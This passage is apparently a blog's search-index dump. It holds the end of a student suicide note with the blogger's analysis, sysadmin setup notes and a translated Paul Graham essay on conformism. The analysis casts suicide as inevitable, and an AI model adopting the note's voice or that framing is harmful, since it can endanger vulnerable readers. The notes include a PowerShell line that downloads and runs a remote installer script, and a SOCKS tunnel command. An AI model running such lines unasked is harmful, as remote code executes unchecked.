我不会试图塑造一个完美的死者形象，那样的形象只能给人一种“我的自杀是一幕毁灭了某种美好事物的悲剧”的印象，只有把一个千疮百孔，扭曲至极的我展现出来，才能让你们体会到选择毁灭的必要性——然而我并不能将这样的自己完全展示出来，因为在写下这段又臭又长的文字的同时，我那些扭曲的，疯狂的，淫猥的想法已经随着我的毁灭一起，埋葬在我的脑海中。 二十年来我坚信做题是唯一出人头地的途径，我因此放弃了其他的方向，使得做题成为我唯一而且是最为突出的优势，并且相信这是唯一的正途。到了大学之后，我竟然听信了某些自由派的鬼话，妄图“全面发展”，因而舍弃了做题这一优势项目。当我意识到问题所在时，为时已晚。这不啻于我的“戈尔巴乔夫改革”，摧毁了我的根基。接下来呢？生活无望，希望崩塌，对明天的期待已经毁灭殆尽，没有了信念和理想。很多美好的事物都毁在这一点上。因为没有了信念，斯大林格勒的62集团军的红军战士们最后退化成了阿富汗战争里的炮灰；的黎波里海岸上的美国海军陆战队变成了PTSD集中营。至于我，失去信念和理想之后就是今天的结局——“苏联解体”。 然后呢？现在的我不知道未来是什么，不知道我想要什么。灵魂的惯性迫使我沿着原有的轨迹前进，而我的灵魂早就没有了一分再向前推进的力气，支撑着我一步一步走下去的只有我对于别人的承诺，这一天的到来是我的决定，不再履行对别人承诺的决定。我被自己失去动力的灵魂拖着前进，今天它的动量在阻力的长久影响下消耗殆尽了，而我也就决定要离开这个世界。毕竟这样活着也没什么意思，一边把自己伪装的上进阳光而且乐观，一边又在别人看不到的角落里释放自己最阴暗的一面。我不再是之前那样的纯粹的一层，和吴法宪，张铁生之流已经没有区别。 我曾经痛恨过很多东西，资本家，白匪军，官僚，保守主义的老棺材瓤子以及它们的走狗们。但是我已经等不到亲手消灭它们的那一天了，同志们，请代替我完成这个任务，拜托了。 好了，和所有人要说的话说完了，接下来我要给一些对我而言很重要的人单独留下一些话。我希望你们能确保下面的话只有他们自己能看见，毕竟在没有特定语境的情况下，我对一个人说的话多半会被误解成另一个意思，这是我动身前最后一个愿望——学校的话，不必去查找那些信件了，那里面没有你们想知道的东西，只有一些我不想让别人知道的东西，其中并不包括我为什么要这么做，因为这个问题的答案在上面已经很明确了。 最后——尽管叶赛宁的诗据说被网易云用户给玩烂了，不过我觉得用叶赛宁辞世之前在列宁格勒的旅馆里用自己的血写下的绝笔作为我对世界的告别还是挺合适的： 再见吧，我的朋友，再见 亲爱的，你永在我的心间。 命中注定要相互离别， 许诺我们在前方相见 再见，朋友，不必悲伤， 也没有必要愁容满面。 人世间死已不是新鲜事。 而活着，也不见得，更为新鲜。”\n 案例解读 当事人的遗书较长，且运用了较多修辞，为便于理解我按顺序将其拆解为以下几个部分：\n 预先替他人开脱责任；呼吁熟人不要借此闹事而从中牟利；为自己的自杀行为定性——经过了慎重考虑但不是完美纯洁的受害者而是扭曲后必然的毁灭 阐述自己的心路历程：进大学前一心“做题”—听信“自由派”妄图全面发展—发现丧失“做题”能力后失去信念希望崩塌 倾诉自己失去动力后强颜生活的麻木和内心的自闭阴暗 表达自己对部分社会成员的痛恨，希望后来人最终消灭之 对一些重要的人单独留话，让学校不必白费工夫从信件里查找自杀原因 最后以叶赛宁的绝笔诗向世界告别  尽管资料有限，但仅从当事人的遗书中，已经可以发现许多。他应该是一个温柔善良的人，处处替他人考虑，也为学校着想，对历史典故甚至是一些较为禁忌的人物生平都知之甚多，还能恰到好处地引用外国诗人的诗，人文素养不差。全文饱含浓烈情感而又娓娓道来，并无激烈言语发泄愤怒，惟有平静叙述宣告心死，相信读者无论是否有相同的经历，都会为之动容。\n但就是这样一个对世界充满善意的大学生，为何早早地而且是“经过深思熟虑”后选择了自我毁灭？\n正如他自己所说，“问题的答案在上面已经很明确了”，第3部分他的心路历程说明了一切。简言之就是，“做题家”尝试改变自我走进新天地，到头来却发现丢失了自己的基本盘，最终丧失信念。\n“做题家”“内卷”这些词汇已经十分流行，之前同样地处北京的某高校曾有传闻称学生熬夜学习猝死，尽管事后当事人澄清只是一时昏迷并无生命危险，但足以说明大学生内卷过度以至于损害身体健康是多么普遍。不过北交大这位学生的案例在典型的同时又有其特别之处，便是他曾经“听信自由派的鬼话”，有过一段尝试“全面发展”的时期，这是将他与其他“做题家”区分开来的地方，但尝试的结局却又证明了他终究不可能和“做题家”分道扬镳，因为他终于认识到了作为没有资源没有背景的普通大学生，追随“自由派”去“全面发展”并不能带来收益，反而削弱了他唯一可以依靠的硬实力，或许是绩点、科研、竞赛，我们无从得知。但压垮他的并不是这些筹码本身，他本可以重新加入“做题家”的行列努力扳回一城，然而他没有，他倦了，他的信念已然崩塌。他放下笔去做一个“自由派”时越轻盈越愉快，他就越没有勇气越不愿捡起笔再去做题，纵然那是一场梦，也不愿醒来。\n但在某种程度上，他又是幸运的。他可能以为如果没有“自由派”的蛊惑，如果他的“做题”根基依然牢固，他就能继续在正途上前进，也许就能凭着过硬的绩点保研到理想的学校，赢得光明的前景。但众多研究生自杀的案例摆在眼前，其中不乏来自名牌高校者，他们其实就是北交大学生的另一种结局，是的，仍然是自杀的结局，只不过多了几年煎熬岁月，多了一层痛苦领悟，最终他们会发现，原来“做题”也只是一条看不到终点的道路，原来没有摩西的手杖就不能让湍流变坦途。\n我们都在玩着一个没有赢家的游戏，无论是中途体力透支倒下，还是技不如人自刎而亡，或是取得了阶段性的胜利，最终却都走向了自杀的道路，这究竟是为什么？我想出问题的是游戏本身，我们已经忍受了野蛮的规则，为之展开了激烈的竞争，到头来又被告知另有一套评分体系，那之前的努力意义何在？一旦产生这种疑问，自杀就在招手了。\n结语 通过对大学生自杀案例的分析，我希望淡化对自杀者本身性格缺陷的放大和谴责，而关注自杀群体的共性特征，追问大学生自杀现象频繁出现的病灶，但愿这个世界多一点关怀和公正。真的猛士，自会奋然前行，如何能让苟活者在淡红的血色中，依稀看见微茫的希望，更是我们要思考的问题。\n","date":"2020-12-30T00:30:02Z","permalink":"https://chinggg.github.io/post/suicide/","tags":["随笔"],"title":"自杀研究：读书报告与案例分析"},{"categories":["记录"],"contents":"Network For hardware stuff, see Wireless\nSSH Key-Auth ssh-keygen -t rsa\nhost {shortName} Hostname {address} Port 22 User {username} IdentityFile {path/to/key}  do not forget to set private key 600\nWin10-OpenSSH-Server   Install from Settings UI : Optional Features\n  Install from PowerShell : Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\n  ===Start-Service   Start-Service sshd # OPTIONAL but recommended: Set-Service -Name sshd -StartupType 'Automatic' # then back to local machine: ssh username@servername  Win32-OpenSSH PS: Set-ExecutionPolicy RemoteSigned or powershell -ExecutionPolicy Bypass -File .\\install-sshd.ps1\nSSH-Tunnel http://wlwang41.github.io/content/ops/ssh%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86.html\nhttps://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/\nSSHFS sshfs -C -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3 \u0026lt;server\u0026gt;:/path /path\nProxy export http_proxy=\u0026quot;http://localhost:1082/\u0026quot; export https_proxy=\u0026quot;http://localhost:1082/\u0026quot; export ftp_proxy=\u0026quot;http://localhost:1082/\u0026quot; export socks_proxy=\u0026quot;http://localhost:1080\u0026quot; export no_proxy=\u0026quot;127.0.0.1,localhost\u0026quot; export ALL_proxy=\u0026quot;socks5://127.0.0.1:1080\u0026quot;  apt: /etc/apt/apt.conf.d/12proxy\nAcquire { HTTP::proxy \u0026quot;http://127.0.0.1:1082\u0026quot;; HTTPS::proxy \u0026quot;socks5h://127.0.0.1:1080\u0026quot;; }  Git: git config --global http.proxy 127.0.0.1:1082\nhttps://note.qidong.name/2020/05/docker-proxy/\nServer ./ew -s ssocksd -l 1080\nClient tsocks: /etc/tsocks.conf\nproxychains: /etc/proxychains.conf\niptables iptables 设计非常灵活，不仅可以当防火墙，还可以进行端口转发，ip 分组过滤等等复杂的功能，甚至可以把它当成微型的编程语言，所以要先俯瞰 iptables 整体的操作逻辑\nTable, Chain 和 Rule 最简单的说法就是 Table 由很多个 Chain 组成，而 Chain 由一些 Rule 串起来组成， 所以称之为”链“。\nRule 就是对于请求一个断言，如果请求满足断言就执行指定的操作（官方文档中称这个操作为目标，Target），举个例子，”如果请求来自 192.168.19.123，就将其拒绝“，这就是一个 Rule，而”拒绝“就是一个目标，常见的目标有接受，拒绝，转发，调用另一个 Chain 等等。\n请求会在 Chain 中自上而下遍历，直到遇到一个匹配的 Rule，然后调用它的目标。\n四表五链 iptables 中 Table 的数目是规定死的四个：\n filter: 过滤功能 nat: 端口映射，地址映射等 mangle: 用于对特定数据包的修改 raw: 优先级最高的 Table  还有五个预定义的 Chain：\n  PREROUTING: 数据包进入路由表之前\n  INPUT: 通过路由表后目的地为本机\n  FORWARD: 通过路由表后，目的地不为本机\n  OUTPUT: 由本机产生，向外转发\n  POSTROUTIONG: 发送到网卡接口之前。如下图：\n   路由决策是指判断数据包的目的地是否是本机，如果是则进入 INPUT Chain，否则进入 FORWARD Chain\n  PREROUTING ，POSTROUTIONG 和 FORWARD 只有作为路由器使用时才会被调用，正常电脑就只会经过 INPUT 和 OUTPUT\n 每个 Table 都含有几个预定义 Chain，优先级从高到低：raw \u0026gt; mangle \u0026gt; nat \u0026gt; filter\n将内置的所有 Chain 串起来看就如下图：\n目标 比如下面的命令：\niptables -A INPUT -p tcp --dport 80 -j ACCEPT 表示如果发现目标端口是 80 的 tcp 流量就放行，其中 -p tcp \u0026ndash;dport 80 就是条件，而 ACCEPT 就称作目标（Target）了。\n-A INPUT 表示将这条 Rule 追加到（Append）INPUT Chain 的最后面，这里没有指定 Table，默认就是 filter，也可以通过 -t 指定 Table。\n常见的目标有：\n ACCEPT:接收数据包 DROP:丢弃数据包 REJECT:丢弃数据包并且返回一个拒绝 REDIRECT:将数据包重定向到另一个端口  匹配条件除了上面两个，还有一些常用的：\n -s 匹配来源 ip \u0026ndash;sport 匹配来源端口 -m state 状态匹配，表示匹配数据包的状态，比如 -m state \u0026ndash;state ESTABLISHED 就表示匹配已经建立了连接的数据包  RDP HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\nPortNumber then restart\n(官方文档只列出第二处)\nAria2 Aria2常见问题\nLinux Power 合盖的不同设定：\n poweroff 和 halt 均是关机（具体实现有区别） hybernate 是休眠，设备断电（同关机状态），内容保存在硬盘中 hybrid-sleep 是混合睡眠，设备通电，内容保存在硬盘和内存中 supspend (或 sleep)是挂起（睡眠），设备通电，内容保存在内存中 lock 是锁屏 kexec 是从当前正在运行的内核直接引导到一个新内核（多用于升级了内核的情况下） ignore 是忽略该动作，即不进行任何电源事件响应  BOOT uncomment GRUB_DISABLE_OS_PROBER=false in /etc/default/grub\nREISUB  Add GRUB_CMDLINE_LINUX_DEFAULT the sysrq_always_enabled=1 variable in /etc/default/grub OR Execute echo kernel.sysrq=1 | sudo tee --append /etc/sysctl.d/99-sysctl.conf AND Execute sudo update-grub or sudo grub-mkconfig -o /boot/grub/grub.cfg  Laptop: Fn+Alt+PrtSc\nOnce you’ve located your SysRq key, please keep the Alt key pressed.\nPackage Manager pacman speed up : XferCommand = /usr/bin/aria2c -x 8 -s 8 --dir $(dirname %o) -o $(basename %o) %u\n-S -U -Q -R\npacman -Qoq /usr/lib/python3.9\nyay Arch 不可直接 pacman 装，clone yay-bin from AUR, makepkg -si\nTerminal Zsh move to zinit\n[[ -f ~/.private.zsh ]] \u0026amp;\u0026amp;s source ~/.private.zsh\nKonsole \u0026lt;c-(\u0026gt; \u0026lt;c-)\u0026gt; split\nYakuake New Session \u0026lt;c-s-T\u0026gt;\nClose Session \u0026lt;c-s-W\u0026gt;\nNext Session \u0026lt;s-Right\u0026gt; ('')\nTmux set -g mouse on setw -g mode-keys vi  KDE Add Panel to the top, Global Menu added by default\nInstall widget Active Window Control to hide title bar for maximized windows\nInstall latte-dock to imitate OS X. Finally I chose to add widget Icons-Only Task Manager to the left of the panel.\nbalooctl disable\nSettings -\u0026gt; Window Behavior -\u0026gt; Window Actions -\u0026gt; Inner Window 左手按键右手鼠标轻松操纵窗口\nFcitx5 \u0026lt;c-7\u0026gt; to remove word from history\n\u0026lt;c-;\u0026gt; to show clipboard by default, having been reset to \u0026lt;c-'\u0026gt;\nUNICODE: Ctrl+Alt+Shift+U\nScripts insert \\ at each EOL: sed -i 's/$/ \\\\/ FILENAME'\ninsert text at the beginning: sed -i '1i text' FILENAME\nWindows 快速配置 手装：\n Git VS Code VS Firefox Windows Terminal, WinGet 保证最新版  Set-ExecutionPolicy RemoteSigned -scope CurrentUser Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://get.scoop.sh') scoop bucket add extras versions java retools scoop install sudo dismplusplus  编辑 .ssh/config\nWin7 only support Python3.8, does not support Docker\nKB3063858 if fail to install Python\nDevelopment Git 使用 ssh 代替 https进行 git 远程操作可以省去每次输入帐号的重复步骤，尽管一开始的密钥配置会略显繁琐。\nssh-keygen -t rsa -C \u0026quot;Whatever\u0026quot; #输入文件名，按两次回车 #ssh-agent -s 无效，则用下面这条 eval $(ssh-agent -s) ssh-add ~/.ssh/id_rsa  Git配置多个SSH Key\n多SSH管理技巧与Git多账户登录\nundo the first commit: git update-ref -d HEAD\nclone from computers: git clone ssh://hostname/path/to/git\n工作生活两不误之 includeIf 语法：\n[includeIf \u0026quot;gitdir:/path/to/repo\u0026quot;] path = /path/to/.gitconfig-oss [includeIf \u0026quot;gitdir:C:/work/\u0026quot;] path = /path/to/.gitconfig-work  Win 上 Git 问题总结：\n Load key invalid format: [https://stackoverflow.com/questions/41563973/git-clone-key-load-public-invalid-format-permission-denied-publickey]  Vim fail to install YCM\nquick comment  \u0026lt;c-V\u0026gt; to enter visual block mode move around to select lines to comment press \u0026lt;s-I\u0026gt; and insert # or // \u0026lt;Esc\u0026gt; then see changes  clipboard inconsistency vim does not support Xorg, missing the +clipboard support. replace it with gvim\nuse \u0026quot;+y to copy to the system clipboard\nto change the default behavior set clipboard=unnamedplus\nresize window \u0026lt;c-W\u0026gt; -/+上下 \u0026lt;\u0026gt;左右\nencode enc,fenc,fencs,tenc\n  enc (encoding) 内部使用的编码\n如buffer，寄存器中的字符串。在Vim打开文本后，如果它的编码方式与它的内部编码不一致，Vim会先把编码转换成内部编码，如果它用的编码中含有没法转换为内部编码的字符，那么这些字符就会丢失掉。默认值是系统的locale来决定。\n  fenc( fileencoding) 文件自身的编码\n从磁盘读文件时，Vim会对文件编码检查，如果文件的编码与Vim内部编码（enc）不同，Vim就会对文本做编码转换，将fenc设置为文件的编码。Vim写文件到磁盘时，如果enc与fenc不一样，Vim就做编码转换，转换成编码fenc保存文件。\n  fencs( fileencodings ) 字符编码的列表\n编码的自动识别就是通过设置fencs实现的。当打开一个文件时，Vim会按照fencs中编码的顺序进行解码操作，如果匹配成功就用该编码来进行解码，并把这种编码设为fenc的值。这里的匹配成功指的是Vim能正确解码，不会出错，但是不保证没有乱码，所以fencs编码列表的顺序设置很关键。latin1是iso8859-1，属于国际化的标准编码，能表示任何字符，所以放到最后\n  tenc( termencoding) 终端使用文本编码，或者说是Vim用于屏幕显示时的编码，显示的时候Vim会把内部编码转换为屏幕编码再输出，也就是说我们从屏幕上看到的字符都是tenc编码的字符，如果为空，默认就是enc。windows平台Gvim会忽略掉tenc。一般就是从一个终端远程登陆到linux系统时候tenc会起作用。\n  VSCode Window: Title Bar Style choose custom\nShortcuts \u0026lt;c-B\u0026gt; toggle side bar\n\u0026lt;c-J\u0026gt; toggle panel\n\u0026lt;c-`\u0026gt;toggle integrated terminal\n\u0026lt;c-K\u0026gt; leader key\n \u0026lt;c-O\u0026gt; Open Folder \u0026lt;c-S\u0026gt; Keyboard Shortcut  vscodevim set a shortcut to \u0026ldquo;Vim: Toggle Vim Mode\u0026rdquo;\n press \u0026lt;c-K\u0026gt;\u0026lt;c-S\u0026gt;, search for it bind it to Ctrl+' (the default shortcut of fcitx5 clipboard is Ctrl+;)  press gcc to comment\nfiles.exclude   Go to File -\u0026gt; Preferences -\u0026gt; Settings (or on Mac Code -\u0026gt; Preferences -\u0026gt; Settings)\n  Pick the workspace settings tab\n  Add this code to the settings.json file displayed on the right side:\n// Place your settings in this file to overwrite default and user settings. { \u0026quot;settings\u0026quot;: { \u0026quot;files.exclude\u0026quot;: { \u0026quot;**/.git\u0026quot;: true, // this is a default value \u0026quot;**/.DS_Store\u0026quot;: true, // this is a default value \u0026quot;**/node_modules\u0026quot;: true, // this excludes all folders // named \u0026quot;node_modules\u0026quot; from // the explore tree // alternative version \u0026quot;node_modules\u0026quot;: true // this excludes the folder // only from the root of // your workspace } } }    large workspace cat /proc/sys/fs/inotify/max_user_watches echo fs.inotify.max_user_watches=524288 \u0026gt;\u0026gt; /etc/sysctl.conf  For Arch:\nls /etc/sysctl.d/*-max_user_watches.conf  echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/50-max_user_watches.conf \u0026amp;\u0026amp; sudo sysctl --system  cat /proc/sys/fs/inotify/max_user_watches  CodeBlocks Missing api-ms-win-crt-*.dll\nInstall VC++ 2015 Redistributable\nFail on Windows Server 2012\nSQL mysql -u {user} -p  ENTER\npostgres \\i 'path/name.sql' to load SQL script\n\\! \u0026lt;command\u0026gt; to run shell command\nshould disable CoW with chattr +C /var/lib/postgres on btrfs\nVirtualize boot VM from physical windows partition，即利用 VBoxManage 从（整个）物理磁盘创建 vmdk，注意 UEFI 启动。VMWare 会自动识别 vmdk 实际指向物理设备而报错，直接从物理磁盘创建即可。注意不要作死启动宿主机系统自身！\nDocker sudo groupadd docker sudo usermod -aG docker $USER docker-compose on PM may be too old, use pip to install, then add $HOME/.local/bin to PATH\nDockerfile best practices\ndocker image/container prune [--filter=]\ndocker container rm $(docker ps -aq -f \u0026quot;since=删掉这个名字对应容器之后创建的所有容器\u0026quot;)\n容器有网络相关错误可能是net.ipv4.ip_forward=0 临时解决 run --network=host\nK8S 一切皆 yaml\n注意 --namespace\n一般不直接 ssh node\nkubectl port-forward pod-name LocalPort:RemotePort\nlibvirt https://ostechnix.com/solved-cannot-access-storage-file-permission-denied-error-in-kvm-libvirt/\nHardware Wireless lspci, rfkill see if blocked\n蓝牙耳机可配对但无法连接： 安装 pulseaudio-bluetooth(怎么 PA15 还不支持高级编码) pulseaudio-modules-bt(https://aur.archlinux.org/packages/pulseaudio-modules-bt/) 再重启 pulseaudio，或者直接上 pipewire\nhowdy https://wszqkzqk.github.io/2021/08/17/%E5%9C%A8Manjaro%E4%B8%8B%E9%85%8D%E7%BD%AE%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/\n找摄像头路径，sudo howdy config 该配置\n由于 kwallet 原因对 sddm 用处不大\nkde, login, system-local-login 以在锁屏启用，必加 try_first_pass\nsu, sudo 不加 try_first_pass，因为在终端中可 C-c。单独 su 需要在 /usr/lib/security/howdy/models 下ln -s user.dat root.dat\nlinux-enable-ir-emitter 开红外，重启后失效的解决方法\nFile System BtrFS 中文博客：https://qsdrqs.site/2021/01/ext4_to_btrfs/ 大概可从 ext4 无损转换，但 grub 等引导项配置需要避坑\n 改 fstab 中的 UUID 和 type 转换根目录，需要 mkinitcpio -P grub-intall 和 grub-mkconfig  新装也需注意，只划整个分区不创子卷意义不大，安装时没注意也可以弥补，只需 chroot 环境下挂载分区，于根目录创建 @name 子卷，再把原来位置的内容移进去，最后分区目录结构如下\n/dev/nvme0n1p4 ├── @ ├── @cache # /var/cache ├── @home ├── @log # /var/log ├── @opt ├── timeshift-btrfs └── @tmp # /var/tmp  snapper 快照\nLVM pvs, pvcreate /dev/\u0026lt;foo\u0026gt;\nvgs vgextend VG PV\nlvs lvresize -l 100%FREE VG/LV\nresize2fs VG/LV  别忘了文件系统扩容\nNTFS sudo mount -t ntfs-3g /dev/nvme0n1p4 /path/to/mount\nNFS CentOS 7安装配置NFS CentOS 7 下 yum 安装和配置 NFS\nServer:\n create folder start servers rpcbind nfs-server edit /etc/exports  exportfs -r showmount -e    Client:\n rpcbind mount [IP]:/ /path/to/mount  VHD Ventoy 插件可启动 VHD 中的文件，虚拟机和U盘启动两不误\n最简单的方法，在 VBox 创建磁盘格式为 VHD 的虚拟机再复制即可\nMPICH\nhttps://stackoverflow.com/questions/14769599/mpi-error-loading-shared-libraries\n總結 用心记,放心阅,方便查\nManjaro踩坑记\nafter remove /bin\ndelete file without rm shred -u unlink\n问题记录 Ubuntu 16.04 to 18.04 断网 能 ping 固定 IP 但 ping 不通域名\nedit /etc/systemd/resolved.conf, let DNS=8.8.8.8\nsystemctl restart systemd-resolved\nDO NOT EDIT /etc/resolv.conf with 127.0.0.53 as a **stub resolver **!\nKDE 桌面崩溃 kquitapp5 plasmashell kstart5 plasmashell killall ksmserver  触摸板突然失灵 sudo modprobe -r i2c_hid # 先卸载模块,或psmouse sudo modprobe i2c_hid # 再装上模块 sudo systemctl daemon-reload #非必须 sytemctl suspend  VMWare报错 先检查是否装对应kernel版本的linux-headers\n每次开机后再输sudo modprobe -a vmw_vmci vmmon\n上述命令亦无效则是kernel版本太新尚无module可用，参见此贴中的步骤，下载该仓库中对应版本执行make即可编译完成\nvmnet8 报错无法联网：sudo systemctl start vmware-networks.service\n基于Qt的软件无法使用fcitx qmake -query查看qt版本及路径等信息\n中文字体选择 常用Web字体\n网页字体测试\nKDE中文字体美化\n","date":"2020-10-28T04:45:41Z","permalink":"https://chinggg.github.io/post/setup/","tags":["环境配置","长期"],"title":"Setup"},{"categories":["随笔"],"contents":"因循的四象限 原文:The Four Quadrants of Conformism\nAuthor : Paul Gramham\nJuly 2020\n给人分类最好的标准之一便是其因循程度和积极性。想象一个平面坐标系，横轴从左到右分别是循规蹈矩的人和独立思考的人，竖轴自底向上是消极温顺的人和积极好斗的人。结果分成四个象限各代表四种人。从左上方开始逆时针旋转，依次是积极守旧型、消极守旧型、消极独立型、积极独立型。\n我认为这四种类型的人在大多数社会都能找到，而一个人被归类入那种象限更多取决于自身的个性而不是社会的流行价值观。[1]\n从儿童中能够找到支持以上两点的绝佳证据。在小学里这四种类型的人都很常见，而学校的规章制度却千篇一律地专制，这无疑表明人能成为何种类型取决于他们自己，而不是由规矩所决定。\n左上方(第二象限)的孩子是积极守旧型，那些向老师告密的红卫兵。他们相信规矩必须被严格遵守，不守规矩的人必须受到惩罚。\n左下方(第三象限)的孩子是消极守旧型，那些温顺如绵羊的老好人。他们小心谨慎、循规蹈矩，但当其他孩子破坏规矩的时候,他们的第一反应是为其可能被罚而担忧，而不是想方设法让他们受罚。\n右上方(第一象限)的孩子是消极独立型，那些心不在焉的游离派。他们对规矩不甚关心，可能连规矩的内容都不太清楚。\n右下方(第四象限)的孩子是积极独立型，那些最淘气的刺头儿。他们看到规矩的第一反应就是质疑之，被吩咐去做某事时，他们往往会和要求对着干。\n当然，在衡量因循程度时，你必须谈及规矩所关系到的对象，而这随着孩子的成长而变化。对于十分幼小的孩子来说，规矩由成人制定。但当孩子长大些，他们的同龄人则成为了规矩的来源。所以一帮少年对学校规则尽可以表示轻蔑，却同样不是独立思考的结果，反而是从众的表现。\n正如我们可以通过叫声分辨鸟的种类，成年人也可以通过言语辨认四种类型的儿童。红卫兵喊叫着“打倒反对派！”，老好人说“邻居们会怎么想？”，游离派声称“各有所好”，刺头儿高呼“但是它的确在动”(原文:Eppur si muove)。\n这四种类型的人并不同样多。消极型的人比积极型的人更多，循规蹈矩者更是远多于独立思考者。所以老好人是最大的一类群体，而刺头儿则最少。\n一个人属于哪种象限更多取决于自身的个性而不是被规矩的类型所限，大多数人就算在完全不同的社会成长仍然会成为和原来属于相同象限的人。\n普利斯顿大学的教授罗伯特·乔治最近写道：\n 我有时侯会问学生：如果他们是生活在废奴前的南方白人，他们在奴隶制上的的立场会是如何？你猜他们怎么说？他们依然会成为废奴主义者！他们依然会勇敢地声讨奴隶制并不遗余力地与之作斗争。\n 教授该是出于礼貌而言止于此，但是学生们在那样的情况下肯定不会坚持成为废奴主义者。实际上，我不惮以最坏的恶意揣测这些学生，他们不仅总体上会表现得和当时的人一样，现在他们之中规矩的积极捍卫者在当时也会是红卫兵式的人物。换句话说，他们不仅不会去反对奴隶制，还会成为奴隶制最坚定的维护者。\n我承认自己怀有偏见，但在我看来那一撮积极守旧型的人对世界上的混乱负有极大的责任，自启蒙运动以来我们演化出的很多措施就是用来保护剩下的人免受侵犯。其中尤为重要的是，“异端”这一概念逐渐淡化，取而代之的是各种不同观点自由辩论的原则，就算有些观点目前还不被认可，尝试践行者也不会受到任何惩罚。[2]\n不过，为什么独立思想者需要被保护呢？因为他们拥有所有的新想法。比如，想当一个成功的科学家，仅仅做到正确是不够的。你必须在其他人都错误的时候保持正确，而循规蹈矩的人是做不到的。类似地，所有成功的创业CEO都不仅拥有主见，还积极伸张。所以社会的繁荣和其拥有限制积极守旧型的措施密切相关，这并非偶然。[3]\n近几年来，我们很多人都注意到那些保护自由探索的措施正在被动摇。有些人说我们是过度反应———因为那些措施并没有被削弱很多，或者是为了更重大的利益让步。我们现在就来处理第二种看法。每当守旧派占上风，他们总是宣称为了更大的利益，只是碰巧每次都是出于一种不同的、不可相容的重大利益。\n至于前一种观点，也就是认为独立思想者敏感过度，自由探索的大门并没有被关得那么严，我想说的是，除非你自己是个有主见的人，否则你无法对此做出判断。除非你自己拥有观念的水位，否则你无法知道它是否正在干涸。而只有独立思想者拥有最先锋的看法，也正因此，他们思想领域探索自由度的变化非常敏感，他们就是煤矿中的金丝雀(译者注:the canaries in this coalmine)。\n守旧者总是宣称他们不想阻塞所有言路，而只是针对坏主意。\n你可能会觉得字里行间其排除异己之心昭然若揭。但我还是要讲清楚为什么我们需要讨论那些“坏主意”，这有两条原因。\n其一，任何决定哪种意见会被禁止的过程都一定会出错。因为没有聪明人想承担这种任务，所以最终这种决定都会由蠢人做出。而当一个过程导致了很多错误，就需要留出误差幅度，也就是减少所禁止的意见数。但积极守旧者很难做到这点，因为他们从小就乐于看到别人受罚，又喜欢互相竞争。正统派的执行者不能容许中间意见的存在，这会给其他执行者以机会在道德纯洁度上占上风，甚至可能会让他们掉转头来攻击自己。所以我们不但不会留出原本所需的误差幅度，反而会出现竞次，最终让所有貌似异端的观点都被禁止。[4]\n其二，观点之间的联系要比看上去紧密得多。如果你限制某些话题的讨论，受到影响的不止是那些话题，限制会传播至任何牵涉到被禁内容的话题，而这并非极端案例。最好的观点往往会在远离起源的领域产生后果。在一个意见会被部分地禁止的世界中拥有想法就像在角落里有雷区的球场上踢足球一样，你会感到球场变了样，不再能踢球如常，就算在安全的地面上也踢得极为压抑。\n过去，独立思想者保护自己的方式是在少数几个地方聚集——最初是在法庭,后来是在大学——在这里他们一定程度上能制定自己的规则。这些可以让人带着想法工作的场所往往拥有保护自由探索的措施，正如晶圆厂拥有强力的空气过滤器，录音棚具有良好的隔音效果。至少在过去几个世纪里，当积极守旧者由于各种原因得以横行霸道的时候，大学是最安全的地方。\n然而不凑巧的是，这一回躲进大学可能不再管用，因为最新一波不宽容的浪潮开始在大学兴起，这股浪潮始于20世纪80年代中期，到2000年似乎已经退去，但就在最近，随着社交媒体的到来，它又死灰复燃了。不幸的是，这似乎是硅谷在自摆乌龙。尽管硅谷的管理者几乎都是独立思想者，但他们给了积极守旧者一个他们做梦都想不到的工具。\n另一方面，也许大学内部自由探究精神的衰退，既是独立思想离开的征兆，也是其原因。50年前本可成为教授的人现在有了其他选择。现在，他们可以成为定量分析师或开创公司。你必须有独立的思想才能在这两方面取得成功。如果这些人成为教授，他们会为了学术自由而进行更严厉的抵抗。因此，也许现在想象独立思想者逃离日渐衰败的大学这一景象会显得过于悲观。大学的衰退，也许正因为很多独立思想者已经离开。\n虽然我花了很多时间思考这种情况，但我无法预测结果如何。会有大学成功扭转当前的趋势，继续保持自己作为独立思想者想要聚集的地方吗？亦或独立思想者会逐渐抛弃大学？我很担心，如果真的走到那一步我们会失去什么。\n但是我对长远的未来抱有希望。独立思考者善于保护自己。如果现存的制度陷入危险，他们会创造新的制度。这需要一定的想象力，但毕竟想象力正是他们的专长。\n作者注：\n[1] 我当然意识到，如果人们的性格在任意两个方面有所不同，你就能以之为坐标轴，把划分出的四个象限称为人格类型。所以我真正要说的是此处这两条轴是正交的，两者有很大的差异\n[2] 积极保守者并不为世界上所有的麻烦负责。麻烦的另一大来源是那种魅力超凡的领导人，他们通过吸引积极保守者而获得权力。当这样的领导人出现时，积极保守型变得更加危险。\n[3] 当我运营Y Combinator时，我从不担心写一些冒犯积极守旧者的东西。如果YC是一家饼干公司，我会面临一个艰难的道德选择。积极守旧者也吃饼干。但他们并没有成功创业。所以，如果我阻止他们申请YC，唯一的影响就是节省我们阅读申请表的工作量。\n[4] 在一个领域已经取得了进步：对谈论被禁思想的惩罚不如过去严厉。被杀的危险很小，至少在较富裕的国家是如此。积极守旧者大多满足于让人被炒鱿鱼。\n[5] 许多教授都有独立的思想，尤其是在数学、硬科学和工程学方面，在这些领域必须靠独立思想取得成功。但学生更能代表普通民众，因此大多是传统思维。所以，当教授和学生之间发生冲突时，这不仅是代际之间的冲突，还是不同类型的人之间的冲突。\n","date":"2020-10-28T00:29:00Z","permalink":"https://chinggg.github.io/post/the-four-quadrants-of-conformism/","tags":["翻译","随笔"],"title":"(译)因循的四象限"},{"categories":null,"contents":"","date":"2020-02-07T17:43:21+08:00","permalink":"https://chinggg.github.io/search/","tags":null,"title":"搜索"},{"categories":null,"contents":"curious but honest, naive but patient.\n ","date":"2018-12-05T13:40:21+08:00","permalink":"https://chinggg.github.io/about/","tags":null,"title":"关于"},{"categories":null,"contents":"友情链接 Canary 